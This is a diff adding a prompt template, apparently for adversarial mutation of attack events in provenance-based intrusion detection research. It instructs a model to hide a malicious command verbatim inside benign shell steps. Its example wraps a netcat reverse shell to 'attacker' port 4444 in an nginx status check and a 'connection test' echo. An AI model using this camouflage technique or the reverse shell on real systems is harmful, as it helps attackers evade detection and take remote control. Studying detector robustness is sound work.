@@ -1,0 +1,40 @@
+[Context]
+For this attack process node, both the command name and the arguments are
+attack-specific and must be preserved verbatim. The mutation extends the
+command by prepending and/or appending benign operations drawn from C,
+embedding the malicious command within a normal workflow.
+
+[Input]
+Process node:
+    command_name = {name}
+    arguments    = {args}
+Context C (neighboring events as typed triples):
+    [(src_type:attr, op, dst_type:attr), ...]
+
+[Task]
+Compose an extended command of the form
+    <benign_prefix> && <original_command> && <benign_suffix>
+where <original_command> is the input `command_name` followed by `arguments`,
+kept verbatim; and prefix/suffix are short benign commands drawn from or
+consistent with C (e.g., a status check or a routine log echo). Either
+prefix or suffix may be empty if a single side is sufficient to make the
+workflow plausible.
+
+[Constraints]
+(1) the original command name and arguments must appear exactly as given;
+(2) the prefix/suffix commands must be legitimate and consistent with C;
+(3) shell-level chaining must use plain operators (`&&`, `;`) commonly
+    observed in C.
+
+[Output]
+JSON: {"new_command_name": "...", "new_arguments": "..."}
+(where new_command_name may be a shell builtin such as `sh -c` and
+new_arguments contains the full extended sequence).
+
+[Example]
+Input: command_name="nc", arguments="-e /bin/sh attacker 4444", C dominated
+by nginx admin checks.
+Output:
+{"new_command_name": "sh",
+ "new_arguments": "-c \"systemctl status nginx && nc -e /bin/sh attacker 4444 && echo \\\"connection test\\\"\""}
+— the reverse shell appears as part of a network diagnostic routine.
